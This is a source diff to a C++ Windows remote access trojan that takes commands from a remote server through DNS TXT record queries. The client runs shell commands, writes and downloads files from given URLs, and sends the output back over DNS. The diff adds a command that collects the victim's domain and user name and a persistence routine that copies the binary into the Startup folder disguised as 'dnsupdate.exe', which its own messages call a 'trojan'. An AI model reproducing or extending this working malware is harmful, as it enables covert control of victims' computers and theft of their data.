@@ -13,7 +13,7 @@
 #include "Util.h"
 using namespace std;
 
-#pragma warning(disable:4996)
+//#pragma warning(disable:4996)
 #pragma comment(lib, "dnsapi.lib")
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "ws2_32.lib")
@@ -26,22 +26,34 @@ enum Op {
 	EXEC = 4,
 	OUTPUT = 5,
 	OUTPUT_DONE = 6,
-	WRITEFILE = 7,
+	WRITE_FILE = 7,
 	GET_DIR = 8,
 	CHANGE_DIR = 9,
 	CREATE_PROCESS = 10,
-	FETCH_FILE = 11
+	FETCH_FILE = 11,
+	QUERY_USERNAME = 12,
+	PERSIST = 13
 };
 
 DNSClient::DNSClient()
 {
 	client_id = 0;
-	interval = 2000;
+	checkin_interval_ms = 2000;
+	send_delay_ms = 500;
+}
+
+static Packet create_packet(unsigned char client_id, unsigned char opcode, const string& data)
+{
+	static unsigned char packet_id = 0;
+	if(++packet_id > 255)
+		packet_id = 0;
+
+	return Packet(client_id, packet_id, opcode, data);
 }
 
 void DNSClient::pack_outbound_queue(unsigned char opcode, string msg)
 {
-	unsigned int bufflen = 43;
+	unsigned int bufflen = 42;
 
 	while(msg.size() % 3 != 0)
 		msg += " ";
@@ -51,16 +63,16 @@ void DNSClient::pack_outbound_queue(unsigned char opcode, string msg)
 		sbuf += *it;
 		if(sbuf.size() == bufflen) {
 			string payload(sbuf);
-			outbound_queue.push_back(Packet(client_id, opcode, payload));
+			outbound_queue.push_back(create_packet(client_id, opcode, payload));
 			sbuf.clear();
 		}
 	}
 	
 	if(!sbuf.empty())
-		outbound_queue.push_back(Packet(client_id, opcode, sbuf));
+		outbound_queue.push_back(create_packet(client_id, opcode, sbuf));
 
 	// tell server we're done sending output from last command
-	outbound_queue.push_back(Packet(client_id, Op::OUTPUT_DONE, ""));
+	outbound_queue.push_back(create_packet(client_id, Op::OUTPUT_DONE, ""));
 }
 
 string DNSClient::get_current_dir()
@@ -75,18 +87,18 @@ string DNSClient::get_current_dir()
 string DNSClient::change_dir(const string& newdir)
 {
 	if(SetCurrentDirectoryA(newdir.c_str()))
-		return "Directory changed successfully.";
+		return "Changed directory to '" + get_current_dir() + "'.";
 	else
 		return "Directory change failed.";
 }
 
 string DNSClient::fetch_file(const string& url)
 {
-	int pos = url.find_last_of('/') + 1;
+	size_t pos = url.find_last_of('/') + 1;
 	string filename = url.substr(pos, string::npos);
 	CHAR path[MAX_PATH];
 	GetCurrentDirectoryA(MAX_PATH, path);
-	sprintf(path, "%s\\%s", path, filename.c_str());
+	sprintf_s(path, sizeof(path), "%s\\%s", path, filename.c_str());
 	HRESULT res = URLDownloadToFileA(NULL, url.c_str(), path, 0, NULL);
 	if(res == S_OK)
 		return "Download successful.";
@@ -117,6 +129,29 @@ void DNSClient::write_file(const string& filename)
 	of << de64(bytes);
 	of.close();
 	packet_buffer.clear();
+}
+
+string DNSClient::query_username()
+{
+	CHAR ubuf[64], dbuf[64], buf[128];
+	GetEnvironmentVariableA("USERNAME", ubuf, sizeof(ubuf));
+	GetEnvironmentVariableA("USERDOMAIN", dbuf, sizeof(dbuf));
+	sprintf_s(buf, sizeof(buf), "%s\\%s", dbuf, ubuf);
+	return string(buf);
+}
+
+string DNSClient::persist()
+{
+	CHAR user_profile[512], dest[512];
+	GetEnvironmentVariableA("USERPROFILE", user_profile, sizeof(user_profile));
+	sprintf_s(dest, sizeof(dest), "%s\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\dnsupdate.exe", user_profile);
+	string src(GetCommandLineA());
+	src.erase(remove(src.begin(), src.end(), '"'), src.end());
+
+	if(CopyFileA(src.c_str(), dest, FALSE))
+		return "Trojan successfully copied to '" + string(dest) + "'.";
+	else
+		return "Failed to copy trojan. Try manually.";
 }
 
 string DNSClient::exec(const string& cmd)
@@ -153,7 +188,7 @@ string DNSClient::exec(const string& cmd)
 	CHAR buf[4096];
 	string out = "";
 	string err = "";
-	bool bSuccess = FALSE;
+	BOOL bSuccess = FALSE;
 
 	while(true) {
 		bSuccess = ReadFile(stdout_r, buf, 4096, &dwRead, NULL);
@@ -182,10 +217,8 @@ void DNSClient::sync()
 	PDNS_RECORD rec;
 	DNS_FREE_TYPE ft = DnsFreeRecordListDeep;
 
-	static string packet_id = "";
-
 	// default to a normal check-in...
-	Packet query = Packet(client_id, Op::CHECKIN, packet_id);
+	Packet query = create_packet(client_id, Op::CHECKIN, "");
 
 	// ...unless there are outbound packets queued
 	if(!outbound_queue.empty()) {
@@ -193,6 +226,7 @@ void DNSClient::sync()
 		outbound_queue.pop_front();
 	}
 
+	//printf("lookup: %s\n", query.flatten().c_str());
 	DNS_STATUS ds = DnsQuery(Util::to_wstring(query.flatten()).c_str(), DNS_TYPE_TEXT, DNS_QUERY_NO_MULTICAST | DNS_QUERY_BYPASS_CACHE, NULL, &rec, NULL);
 	if(ds == NO_ERROR) {
 		// store the TXT records
@@ -211,11 +245,8 @@ void DNSClient::sync()
 		string reassembled_payload = Util::order_chunks(chunks);
 
 		vector<string> tokens = Splitter::split(reassembled_payload, ',');
-		unsigned int foreign_packet_id = atoi(tokens[0].c_str());
-		unsigned int opcode = atoi(tokens[1].c_str());
+		unsigned char opcode = atoi(tokens[1].c_str());
 		string data;
-
-		packet_id = tokens[0].c_str();
 
 		// if there's a data token, run it through the replace_char function
 		// so the client's base64 functions can operate on it, else set to empty
@@ -235,52 +266,44 @@ void DNSClient::sync()
 				break;
 
 			case Op::ASSIGN_ID:
-			{
 				client_id = atoi(data.c_str());
 				break;
-			}
 
 			case Op::EXEC:
-			{
 				pack_outbound_queue(Op::OUTPUT, exec(de64(data)));
 				break;
-			}
 
 			case Op::BUFFER:
-			{
-				packet_buffer.push_back(Packet(client_id, Op::BUFFER, data)); 
+				packet_buffer.push_back(create_packet(client_id, Op::BUFFER, data)); 
 				break;
-			}
 
-			case Op::WRITEFILE:
-			{
+			case Op::WRITE_FILE:
 				write_file(data);
 				break;
-			}
 
 			case Op::GET_DIR:
-			{
 				pack_outbound_queue(Op::OUTPUT, get_current_dir());
 				break;
-			}
 
 			case Op::CHANGE_DIR:
-			{
 				pack_outbound_queue(Op::OUTPUT, change_dir(data));
 				break;
-			}
 
 			case Op::CREATE_PROCESS:
-			{
 				pack_outbound_queue(Op::OUTPUT, create_process(data));
 				break;
-			}
 
 			case Op::FETCH_FILE:
-			{
 				pack_outbound_queue(Op::OUTPUT, fetch_file(data));
 				break;
-			}
+
+			case Op::QUERY_USERNAME:
+				outbound_queue.push_back(create_packet(client_id, Op::QUERY_USERNAME, query_username()));
+				break;
+
+			case Op::PERSIST:
+				pack_outbound_queue(Op::OUTPUT, persist());
+				break;
 		}
 	}
 }
@@ -293,9 +316,9 @@ int DNSClient::main()
 	while(true) {
 		sync();
 		if(!outbound_queue.empty())
-			Sleep(300);
+			Sleep(send_delay_ms);
 		else
-			Sleep(interval);
+			Sleep(checkin_interval_ms);
 	}
 
 	WSACleanup();
@@ -303,7 +326,8 @@ int DNSClient::main()
 	return 0;
 }
 
-int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
+//int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
+int main(int argc, char** argv)
 {
 	DNSClient c;
 	return c.main();
